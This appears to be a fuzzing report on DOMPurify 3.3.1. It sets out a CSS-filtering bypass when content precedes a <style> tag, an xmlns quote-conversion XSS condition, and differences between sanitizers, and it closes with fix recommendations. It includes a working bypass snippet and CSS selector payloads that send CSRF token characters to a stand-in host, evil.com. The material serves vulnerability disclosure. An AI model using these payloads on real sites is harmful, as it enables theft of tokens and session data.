# DOMPurify Sanitizer Bypass — Fuzzing Report

**Date:** 2026-02-22
**Tool:** web-fuzzer (grammar-based differential HTML fuzzer)
**Target:** DOMPurify 3.3.1 (via JSDOM)
**Reference sanitizers:** sanitize-html, js-xss
**Total executions:** ~7,950 across 6 sessions

---

## Verified Findings

### 1. CSS Sanitization Bypass via Body-Context `<style>` (CSS Injection → Data Exfiltration)

**Severity:** HIGH
**Category:** CSS Sanitization Logic Bug → CSS Injection

DOMPurify completely skips CSS content filtering when any non-whitespace content
precedes the `<style>` tag. This bug enables arbitrary CSS injection, which can be
chained with CSS attribute selectors + `@import url()` to **exfiltrate sensitive data
(CSRF tokens, passwords, etc.) without any JavaScript**.

#### Bug Reproduction

```html
<!-- Blocked: <style> is the first element (parsed in head context) -->
DOMPurify.sanitize('<style>@import url("javascript:x");</style>')
→ ""  ✅ Filtered

<!-- Bypass: single character "x" before <style> (parsed in body context) -->
DOMPurify.sanitize('x<style>@import url("javascript:x");</style>')
→ 'x<style>@import url("javascript:x");</style>'  ❌ CSS filtering completely bypassed!
```

> **Note:** `javascript:` URIs are blocked in CSS context by all modern browsers, so
> direct JS execution via CSS is not possible. However, the core issue is that
> **DOMPurify's entire CSS content filtering is disabled**, enabling CSS injection
> for data exfiltration — which works on all current browsers.

#### Bypass Conditions

| Prefix | Result | Reason |
|--------|--------|--------|
| (none) | Blocked | style parsed in head context |
| Whitespace (space, \n, \t) | Blocked | Parser ignores whitespace |
| HTML comment `<!-- -->` | Blocked | Comments don't trigger body context |
| `<title>` | Blocked | Head-context element |
| Single character `x` | **Bypass** | Text node → body context |
| Zero-width space `\u200B` | **Bypass** | Non-whitespace Unicode |
| NBSP `\xA0` | **Bypass** | Non-standard whitespace |
| BOM `\xEF\xBB\xBF` | **Bypass** | BOM as text content |
| `<div></div>` | **Bypass** | Body element |
| `<p>text</p>` | **Bypass** | Body element |
| `<br>`, `<img>` | **Bypass** | Body elements |

In real-world applications, sanitized user content is **nearly always** inserted inside
other HTML elements, meaning this bypass condition is **virtually always met**.

#### Root Cause

DOMPurify applies CSS content inspection (filtering `javascript:` URIs, `expression()`,
etc.) only when the `<style>` element is parsed in head context by the HTML5 parser.
When any text node or body-context element precedes `<style>`, the parser treats it as
a body-context element, and DOMPurify skips all CSS content filtering.

#### Attack Scenario: CSRF Token Exfiltration

```
1. Target page contains a CSRF token:
   <input type="hidden" name="csrf" value="a8f3e...">

2. Attacker submits a comment containing CSS injection payload:
   Nice post!<style>
   input[name="csrf"][value^="a"] ~ * { background: url(https://evil.com/leak?v=a); }
   input[name="csrf"][value^="b"] ~ * { background: url(https://evil.com/leak?v=b); }
   ...
   </style>

3. Server sanitizes with DOMPurify, but "Nice post!" precedes <style>
   → CSS filtering bypassed, entire <style> content passes through

4. Browser applies CSS → attribute selector matches the CSRF token
   → browser fetches background-image URL → attacker's server receives the token value

5. Attacker chains @import url() to load next-character CSS from their server
   → full token extracted character by character
```

#### Impact Assessment

| Factor | Detail |
|--------|--------|
| **No JavaScript required** | Bypasses `script-src 'self'` CSP entirely |
| **No user interaction** | Triggers automatically on page load |
| **All modern browsers** | CSS attribute selectors + background-image are universal |
| **CSP bypass** | Most apps allow `style-src 'unsafe-inline'` or omit style-src |
| **Exfiltration targets** | CSRF tokens, OAuth tokens, hidden input values, data-* attributes |

#### References

- [Blind CSS Exfiltration (PortSwigger Research)](https://portswigger.net/research/blind-css-exfiltration)
- [CSS Injection (HackTricks)](https://book.hacktricks.wiki/en/pentesting-web/xs-search/css-injection/index.html)
- [CSS Data Exfiltration to Steal OAuth Token](https://blog.voorivex.team/css-data-exfiltration-to-steal-oauth-token)
- [Stealing private data with a CSS injection (Invicti)](https://www.invicti.com/blog/web-security/private-data-stolen-exploiting-css-injection)

**PoC:** `poc/poc_css_data_exfil.html`

---

### 2. xmlns Attribute Value Event Handler Injection (quote-conversion condition)

**Severity:** MEDIUM (conditional)
**Category:** mXSS Adjacent / Attribute Value Injection

DOMPurify allows event handler patterns embedded within `xmlns` attribute values
using mixed quote styles. The value is safe while wrapped in double quotes, but
becomes exploitable if any downstream processing converts to single quotes.

```
Safe (double-quoted):
  <math xmlns="http://www.w3.org/1998/Mat' onload='alert(1)//h/MathML">
  → onload is text inside the attribute value

Dangerous (if converted to single quotes):
  <math xmlns='http://www.w3.org/1998/Mat' onload='alert(1)//h/MathML'>
  → onload parsed as a separate attribute → XSS!
```

#### Exploitation Conditions
- Server-side template engine converts attribute quotes to single quotes
- HTML pretty-printer normalizes quote style
- SSR framework re-renders with different serialization
- Custom proxy/middleware modifies quoting

**PoC:** `poc/poc_xmlns_onload_mxss.html`

---

### 3. Structural Output Divergence Across Sanitizers

**Severity:** INFORMATIONAL
**Category:** Differential Behavior

The three sanitizers produce fundamentally different outputs for identical inputs.
Confirmed across all 6 fuzzing sessions.

| Sanitizer | Strategy | MathML/SVG | Form Elements | Semantic HTML |
|-----------|----------|-----------|--------------|---------------|
| DOMPurify 3.x | Allowlist (permissive) | **Allows** | **Allows** | **Allows** |
| sanitize-html | Allowlist (restrictive) | Strips | Strips | Strips |
| js-xss | Entity-encoding | Encodes | Encodes | Encodes |

Elements preserved by DOMPurify (MathML, SVG, form, details, etc.) expand the
attack surface for parser-differential attacks and namespace-switching mXSS.

**PoC:** `poc/poc_differential_sanitizer_behavior.html`

---

## Recommendations

1. **DOMPurify bug report:** CSS content filtering must apply regardless of `<style>`
   parsing context. The body-context bypass is a logic bug.
2. **DOMPurify:** Block event handler patterns inside `xmlns` attribute values.
3. **Application developers:** Use `FORBID_TAGS: ['style']` if inline CSS is not required
   (strongly recommended).
4. **Application developers:** Never re-serialize DOMPurify output with different quoting.
5. **Defense in depth:** Enforce CSP headers — `style-src 'self'` (remove `unsafe-inline`).

---

## Reproduction Tools

| File | Description |
|------|-------------|
| `poc/poc_css_data_exfil.html` | CSS injection data exfiltration PoC (CSRF token leak demo) |
| `poc/poc_xmlns_onload_mxss.html` | xmlns onload mXSS PoC (quote-conversion test) |
| `poc/poc_differential_sanitizer_behavior.html` | Sanitizer comparison demo |
| `targets/test_css_import5.js` | Node.js bypass condition analysis script |
| `targets/verify_mxss.js` | JSDOM-based mXSS verification script |
